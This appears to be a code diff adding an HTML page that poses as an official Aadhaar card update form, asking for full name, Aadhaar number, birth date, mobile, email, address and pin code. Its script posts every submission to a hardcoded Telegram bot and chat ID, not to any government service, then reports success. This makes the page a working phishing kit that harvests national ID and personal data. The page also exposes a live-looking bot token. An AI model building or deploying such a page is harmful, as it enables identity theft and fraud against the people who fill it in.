@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Aadhaar Card Update Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      padding: 20px;
+      max-width: 500px;
+      margin: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 10px gray;
+    }
+    h2 {
+      text-align: center;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Aadhaar Card Update Form</h2>
+    <form id="aadharForm">
+      <label>Full Name</label>
+      <input type="text" name="fullname" required>
+
+      <label>Aadhaar Number</label>
+      <input type="text" name="aadhar" maxlength="12" required>
+
+      <label>Date of Birth</label>
+      <input type="date" name="dob" required>
+
+      <label>Gender</label>
+      <select name="gender" required>
+        <option value="">Select</option>
+        <option>Male</option>
+        <option>Female</option>
+        <option>Other</option>
+      </select>
+
+      <label>Mobile Number</label>
+      <input type="tel" name="mobile" pattern="[0-9]{10}" required>
+
+      <label>Email ID</label>
+      <input type="email" name="email">
+
+      <label>Address</label>
+      <input type="text" name="address" required>
+
+      <label>Pin Code</label>
+      <input type="text" name="pincode" pattern="[0-9]{6}" required>
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("aadharForm");
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const data = new FormData(form);
+      const msg = `
+🆔 *New Aadhaar Update Request*
+
+👤 *Name:* ${data.get("fullname")}
+🔢 *Aadhaar:* ${data.get("aadhar")}
+🎂 *DOB:* ${data.get("dob")}
+⚧ *Gender:* ${data.get("gender")}
+📞 *Mobile:* ${data.get("mobile")}
+📧 *Email:* ${data.get("email")}
+🏠 *Address:* ${data.get("address")}
+📮 *Pin Code:* ${data.get("pincode")}
+      `;
+
+      fetch(`https://api.telegram.org/bot7641600096:AAF2KShllYD6MKx2rZ_aIOwqDdF4hi1rJTc/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: "6861912709",
+          text: msg,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("Form submitted successfully!");
+          form.reset();
+        } else {
+          alert("Failed to send message on Telegram.");
+        }
+      })
+      .catch(error => {
+        alert("Error occurred: " + error.message);
+      });
+    });
+  </script>
+</body>
+</html>
